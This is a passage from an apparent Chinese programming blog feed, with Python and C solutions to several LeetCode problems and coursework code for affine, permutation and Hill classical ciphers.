<li><p>原理：</p>
<p>利用滑动窗口的概念，即设置一个窗口空间，用来保存子串</p>
<p>遍历源字符串s，并加到子串中，当新加元素在子串中包含时，源子串固化成为<strong>没有重复字符的子串</strong>(不包括新加重复元素)</p>
<p>从源子串开头删到重复元素(包括重复元素)，变为新子串的前缀，并将新加元素添加到末尾</p>
<p>按照上述方式不断获取<strong>没有重复字符的子串</strong></p>
<p>即，窗口的大小在不断变化，其中窗口大小的最大值就是无重复字符的最长字串的长度</p>
</li>
<li><p>实现：</p>
<p><em>python版本</em></p>
<p>利用FIFO的队列思想来实现（利用列表的<code>append()</code>和<code>pop(0)</code>来实现）</p>
<ol>
<li><p>遍历源字符串s，将每个元素加入到队列中</p>
</li>
<li><p>当新加元素队列中重复时，先保存当前队列的大小，并与max比较，数值大者写入到max中，然后队列中队首弹出元素，直到将队列中与新加元素的重复元素弹出，将新加重复元素添加到队尾</p>
</li>
<li><p>遍历结束完源字符串s后，再将此时队列的长度与max比较，返回最大值</p>
</li>
</ol>
</li>
</ol>
<p>   <em>c语言版本</em></p>
<p>   在c语言版本中也用到了滑动窗口的思想，不过具体是用下标来实现的</p>
<ol>
<li><p>用到start和end标记窗口的前后分界</p>
</li>
<li><p>用end来遍历s，当检测出在end处的字符有在窗口中时，记录 end - start 的长度与max取最大值为max，即<code>max = MAX(max, end - start)</code> ，同时移动start到窗口中重复元素之后的一个位置</p>
<p>这里用来检测重复元素用的是数组标记法，即用长度为128(之所以128，是因为元素不只是字母，还有特殊字符)的数组保存每个元素在窗口出现的次数，下标映射关系就是 <code>下标 = s[end] - &#39; &#39;</code></p>
</li>
<li><p>最后返回max即可</p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解2</title>
    <url>/2020/01/26/LeetCode%E9%A2%98%E8%A7%A32/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第2题，两数相加</strong></p>
<p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<blockquote>
<p>示例：</p>
<p>输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 0 -&gt; 8<br>原因：342 + 465 = 807</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        root = ListNode(<span class="number">0</span>)</span><br><span class="line">        node = root</span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(l1 <span class="keyword">or</span> l2):</span><br><span class="line">            x = l1.val <span class="keyword">if</span> l1 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            y = l2.val <span class="keyword">if</span> l2 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            s = carry + x + y</span><br><span class="line">            carry = s // <span class="number">10</span></span><br><span class="line">            node.next = ListNode(s%<span class="number">10</span>)</span><br><span class="line">            node = node.next</span><br><span class="line">            <span class="keyword">if</span>(l1!=<span class="literal">None</span>):</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span>(l2!=<span class="literal">None</span>):</span><br><span class="line">                l2 = l2.next</span><br><span class="line">        <span class="keyword">if</span>(carry&gt;<span class="number">0</span>):</span><br><span class="line">            node.next = ListNode(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> root.next</span><br></pre></td></tr></table></figure>



<p><img src="https://s2.ax1x.com/2020/01/26/1nKV5q.png" alt="1nKV5q.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">root</span>;</span></span><br><span class="line">        root = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">node</span> = <span class="title">root</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (l1 || l2)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">n</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">            n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (l1)</span><br><span class="line">                x = l1-&gt;val;</span><br><span class="line">            <span class="keyword">if</span> (l2)</span><br><span class="line">                y = l2-&gt;val;</span><br><span class="line">            n-&gt;val = (x + y + carry)%<span class="number">10</span>;</span><br><span class="line">            carry = (x + y + carry)/<span class="number">10</span>;</span><br><span class="line">            node-&gt;next = n;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (l1)&#123;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l1 = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2)&#123;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l2 = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">n</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">            n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            n-&gt;val = <span class="number">1</span>;</span><br><span class="line">            node-&gt;next = n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/26/1nKn2T.png" alt="1nKn2T.png"></p>
<p><strong>题解：</strong></p>
<p>利用链表构造</p>
<p>首先生成根节点root，并记录下来</p>
<p>逐位相加 L1 和 L2，分三种情况：</p>
<ol>
<li>在该位上，L1 和 L2 都有数值，计算值为 L1 L2 相加并模10取余，加数超过10，则进位carry为1，加入到下一位的计算中</li>
<li>在该位上，L1 有值，L2 为空，则计算值为 L1 的值</li>
<li>在该位上，L2 有值，L1 为空，则计算值为 L2 的值</li>
</ol>
<p>在结束运算时，注意关注carry的值，此时它是 L1 L2 最高位相加的进位值，若为1，则计算值要进一位</p>
<p>最后返回根节点root中的next指针</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码</title>
    <url>/2020/01/24/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p>(1) 仿射密码  </p>
<p>参数选取：模数n=26+10=36 (26个字母+10个数字)，k2 = 学号后3位 mod n；k1 = 学号后4位 mod n, 若k1与n不互素，则更新k1 = k1+7 或 k1 = k1-7。</p>
<a id="more"></a>

<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">n = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a%b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(x,m = n)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> itertools.count(<span class="number">1</span>): </span><br><span class="line">        <span class="comment">#itertools.count(start,step)函数的意思是创建一个从start开始每次的步长是step的无穷序列</span></span><br><span class="line">        <span class="keyword">if</span> (x*y)%m==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> y</span><br><span class="line"> </span><br><span class="line">k1 = int(input(<span class="string">"输入学号后四位："</span>)) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd(n, k1) != <span class="number">1</span>:</span><br><span class="line">    k1 += <span class="number">7</span></span><br><span class="line">    k1 %= n</span><br><span class="line">    print(<span class="string">"k1与n不互素，更新k1:"</span>,k1)</span><br><span class="line">k2 = int(input(<span class="string">"输入学号后三位："</span>)) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (k1*x+k2)%n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (find(k1)*(x-k2))%n</span><br><span class="line"></span><br><span class="line">U = &#123;<span class="string">'0'</span>:<span class="number">0</span>,<span class="string">'1'</span>:<span class="number">1</span>,<span class="string">'2'</span>:<span class="number">2</span>,<span class="string">'3'</span>:<span class="number">3</span>,<span class="string">'4'</span>:<span class="number">4</span>,<span class="string">'5'</span>:<span class="number">5</span>,<span class="string">'6'</span>:<span class="number">6</span>,<span class="string">'7'</span>:<span class="number">7</span>,<span class="string">'8'</span>:<span class="number">8</span>,<span class="string">'9'</span>:<span class="number">9</span>,<span class="string">'a'</span>:<span class="number">10</span>,<span class="string">'b'</span>:<span class="number">11</span>,<span class="string">'c'</span>:<span class="number">12</span>,<span class="string">'d'</span>:<span class="number">13</span>,<span class="string">'e'</span>:<span class="number">14</span>,<span class="string">'f'</span>:<span class="number">15</span>,<span class="string">'g'</span>:<span class="number">16</span>,<span class="string">'h'</span>:<span class="number">17</span>,<span class="string">'i'</span>:<span class="number">18</span>,<span class="string">'j'</span>:<span class="number">19</span>,<span class="string">'k'</span>:<span class="number">20</span>,<span class="string">'l'</span>:<span class="number">21</span>,<span class="string">'m'</span>:<span class="number">22</span>,<span class="string">'n'</span>:<span class="number">23</span>,<span class="string">'o'</span>:<span class="number">24</span>,<span class="string">'p'</span>:<span class="number">25</span>,<span class="string">'q'</span>:<span class="number">26</span>,<span class="string">'r'</span>:<span class="number">27</span>,<span class="string">'s'</span>:<span class="number">28</span>,<span class="string">'t'</span>:<span class="number">29</span>,<span class="string">'u'</span>:<span class="number">30</span>,<span class="string">'v'</span>:<span class="number">31</span>,<span class="string">'w'</span>:<span class="number">32</span>,<span class="string">'x'</span>:<span class="number">33</span>,<span class="string">'y'</span>:<span class="number">34</span>,<span class="string">'z'</span>:<span class="number">35</span>&#125;</span><br><span class="line">V = &#123;<span class="number">0</span>:<span class="string">'0'</span>,<span class="number">1</span>:<span class="string">'1'</span>,<span class="number">2</span>:<span class="string">'2'</span>,<span class="number">3</span>:<span class="string">'3'</span>,<span class="number">4</span>:<span class="string">'4'</span>,<span class="number">5</span>:<span class="string">'5'</span>,<span class="number">6</span>:<span class="string">'6'</span>,<span class="number">7</span>:<span class="string">'7'</span>,<span class="number">8</span>:<span class="string">'8'</span>,<span class="number">9</span>:<span class="string">'9'</span>,<span class="number">10</span>:<span class="string">'a'</span>,<span class="number">11</span>:<span class="string">'b'</span>,<span class="number">12</span>:<span class="string">'c'</span>,<span class="number">13</span>:<span class="string">'d'</span>,<span class="number">14</span>:<span class="string">'e'</span>,<span class="number">15</span>:<span class="string">'f'</span>,<span class="number">16</span>:<span class="string">'g'</span>,<span class="number">17</span>:<span class="string">'h'</span>,<span class="number">18</span>:<span class="string">'i'</span>,<span class="number">19</span>:<span class="string">'j'</span>,<span class="number">20</span>:<span class="string">'k'</span>,<span class="number">21</span>:<span class="string">'l'</span>,<span class="number">22</span>:<span class="string">'m'</span>,<span class="number">23</span>:<span class="string">'n'</span>,<span class="number">24</span>:<span class="string">'o'</span>,<span class="number">25</span>:<span class="string">'p'</span>,<span class="number">26</span>:<span class="string">'q'</span>,<span class="number">27</span>:<span class="string">'r'</span>,<span class="number">28</span>:<span class="string">'s'</span>,<span class="number">29</span>:<span class="string">'t'</span>,<span class="number">30</span>:<span class="string">'u'</span>,<span class="number">31</span>:<span class="string">'v'</span>,<span class="number">32</span>:<span class="string">'w'</span>,<span class="number">33</span>:<span class="string">'x'</span>,<span class="number">34</span>:<span class="string">'y'</span>,<span class="number">35</span>:<span class="string">'z'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">()</span>:</span></span><br><span class="line">    m = input(<span class="string">"输入要加密字符串：\n"</span>)</span><br><span class="line">    c_list = []</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        c_list.append(enc(U[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c_list:</span><br><span class="line">        c += V[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></span><br><span class="line">    c = input(<span class="string">"输入要解密的字符串：\n"</span>)</span><br><span class="line">    m_list = []</span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        m_list.append(dec(U[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m_list:</span><br><span class="line">        m += V[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    change = input(<span class="string">"1.加密 2.解密:"</span>)</span><br><span class="line">    <span class="keyword">if</span> change == <span class="string">'1'</span>:</span><br><span class="line">        c = encryption()</span><br><span class="line">        print(<span class="string">"密文为:"</span>,c)</span><br><span class="line">    <span class="keyword">elif</span> change == <span class="string">'2'</span>:</span><br><span class="line">        m = decrypt()</span><br><span class="line">        print(<span class="string">"明文为:"</span>,m)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>​    将26个字母和10位数字映射到0-35上</p>
<p>​    加密为 (k1*x+k2)%n</p>
<p>​    解密为 ((k1^-1)*(x-k2))%n</p>
<p>(2) 置换密码</p>
<p>参数选取：分组长度为7；置换关系随机选取；</p>
<p>长度不足时后面全补填充长度。</p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Group</span><span class="params">(m1,model)</span>:</span></span><br><span class="line">    m1_list = []</span><br><span class="line">    m1_list_new = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m1:</span><br><span class="line">        m1_list.append(i)</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">'1'</span>:</span><br><span class="line">        rules = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="string">'2'</span>:</span><br><span class="line">        rules = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rules:</span><br><span class="line">        m1_list_new.append(m1_list[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(m1_list_new)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_or_dec</span><span class="params">()</span>:</span></span><br><span class="line">    model = input(<span class="string">"1,加密 2,解密："</span>)</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">'1'</span>:</span><br><span class="line">        m = input(<span class="string">"输入明文字符串："</span>)</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="string">'2'</span>:</span><br><span class="line">        m = input(<span class="string">"输入密文字符串："</span>)</span><br><span class="line">    patch = <span class="number">7</span> - len(m)%<span class="number">7</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">7</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span> - len(m)%<span class="number">7</span>):</span><br><span class="line">            m += str(patch)</span><br><span class="line">    m_list= []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        m_list.append(i)</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    m1 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(m)/<span class="number">7</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            m1 += m_list[<span class="number">7</span>*i+j]</span><br><span class="line">        c1 = Group(m1,model)</span><br><span class="line">        m1 = <span class="string">''</span></span><br><span class="line">        c += c1</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):    </span><br><span class="line">    k = enc_or_dec()</span><br><span class="line">    print(k)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>正置换：[4,1,0,6,3,5,2]</p>
<p>逆置换：[2,1,6,4,0,5,3]</p>
<p>(3) Hill密码 </p>
<p>参数选取：密钥矩阵和明文/密文的元素均取自 Z26</p>
<p>密钥矩阵为：<img src="https://i.loli.net/2019/12/20/4cajiulRt3BH8eF.png" alt="UTOOLS1576823947931.png"></p>
<p>加解密：若明文为7,8,11,11, 计算密文；若密文为9,8,8,24，计算明文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod26</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        B.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            j %= <span class="number">26</span></span><br><span class="line">            B[<span class="number">-1</span>].append(j)</span><br><span class="line">    <span class="keyword">return</span> B</span><br><span class="line"></span><br><span class="line">A_list = [[<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>],</span><br><span class="line">          [<span class="number">6</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">10</span>],</span><br><span class="line">          [<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">9</span>],</span><br><span class="line">          [<span class="number">10</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">4</span>]]</span><br><span class="line"><span class="comment">#求逆</span></span><br><span class="line">K = np.linalg.inv(A_list)</span><br><span class="line">K_int = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    K_int.append([])</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">        K_int[<span class="number">-1</span>].append(int(round(j))) <span class="comment">#round用来四舍五入</span></span><br><span class="line">A_list_inverse = mod26(K_int)</span><br><span class="line"><span class="comment">#矩阵化</span></span><br><span class="line">A = np.array(mod26(A_list))</span><br><span class="line">A_inverse = np.array(A_list_inverse)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>): <span class="comment">#python矩阵模块的使用</span></span><br><span class="line">    select = input(<span class="string">"1,加密 2,解密："</span>)</span><br><span class="line">    s = input(<span class="string">"输入(逗号相隔)："</span>)</span><br><span class="line">    S_list = s.split(<span class="string">','</span>)</span><br><span class="line">    S_list_int = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> S_list:</span><br><span class="line">        S_list_int.append(int(i))</span><br><span class="line">    S = np.array(S_list_int)</span><br><span class="line">    <span class="keyword">if</span> select == <span class="string">'1'</span>:</span><br><span class="line">        OUT = np.dot(S,A)</span><br><span class="line">        OUT_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> OUT:</span><br><span class="line">            OUT_list.append(i%<span class="number">26</span>)</span><br><span class="line">        print(OUT_list)</span><br><span class="line">    <span class="keyword">elif</span> select == <span class="string">'2'</span>:</span><br><span class="line">        OUT = np.dot(S,A_inverse)</span><br><span class="line">        OUT_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> OUT:</span><br><span class="line">            OUT_list.append(i%<span class="number">26</span>)</span><br><span class="line">        print(OUT_list)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>对矩阵取模函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod26</span><span class="params">(A)</span>:</span></span><br><span class="line">    B = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">        B.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            j %= <span class="number">26</span></span><br><span class="line">            B[<span class="number">-1</span>].append(j)<span class="comment">#加入到B新增的元素中，该元素为1*n矩阵</span></span><br><span class="line">    <span class="keyword">return</span> B</span><br></pre></td></tr></table></figure>

<p>A为n*n矩阵，for i in A 则遍历n次，</p>
<p>每次i为1*n矩阵，用for j in i 遍历i，对j取模26，在加入B中。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>古典密码</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解35</title>
    <url>/2020/01/23/LeetCode%E9%A2%98%E8%A7%A335/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第35题，搜索插入位置</strong></p>
<p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p>
<p>你可以假设数组中无重复元素。</p>
<blockquote>
<p>示例 1:</p>
<p>输入: [1,3,5,6], 5<br>输出: 2</p>
<p>示例 2:</p>
<p>输入: [1,3,5,6], 2<br>输出: 1</p>
<p>示例 3:</p>
<p>输入: [1,3,5,6], 7<br>输出: 4</p>
<p>示例 4:</p>
<p>输入: [1,3,5,6], 0<br>输出: 0</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">searchInsert</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = len(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start + <span class="number">1</span> &lt; end :</span><br><span class="line">            mid = int((start + end)/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> nums[mid] &lt;= target : </span><br><span class="line">                start = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = mid</span><br><span class="line">        <span class="keyword">if</span> nums[start] &gt;= target :</span><br><span class="line">            <span class="keyword">return</span> start</span><br><span class="line">        <span class="keyword">if</span> nums[end] &gt;= target :</span><br><span class="line">            <span class="keyword">return</span> end</span><br><span class="line">        <span class="keyword">return</span> end+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/23/1V3BHs.png" alt="1V3BHs.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">end</span> = numsSize - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(start + <span class="number">1</span> &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + <span class="built_in">end</span>)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt;= target)&#123;</span><br><span class="line">            start = mid;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">end</span> = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">        <span class="keyword">return</span> start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nums[<span class="built_in">end</span>] &gt;= target)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">end</span>+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/23/1V8aPx.png" alt="1V8aPx.png"></p>
<p><strong>解析：</strong></p>
<p>使用二分法查找：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(start + <span class="number">1</span> &lt; <span class="built_in">end</span>)&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (start + <span class="built_in">end</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(nums[mid] &lt;= target)&#123;</span><br><span class="line">        start = mid;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       	<span class="built_in">end</span> = mid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用mid将范围区间不断缩小，最后使其定位到[start，end]之间，其中end = start + 1。</p>
<p>循环条件为start + 1 &lt; end ，等价于 start + 1 != end。</p>
<p>已知有序数组nums和target。则存在多种情况：</p>
<ol>
<li><p>target &lt; nums[0]</p>
<p>则此时start = 0 ，end = 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 0。</p>
</li>
<li><p>target = nums[i]</p>
<p>则此时start = i，end = i + 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[start] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 i。</p>
</li>
<li><p>target &gt; nums[i]   target &lt; nums[i+1]</p>
<p>则此时start = i，end = i + 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[<span class="built_in">end</span>] &gt;= target)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">end</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则返回 i + 1。</p>
</li>
<li><p>target &gt; nums[numsSize - 1]</p>
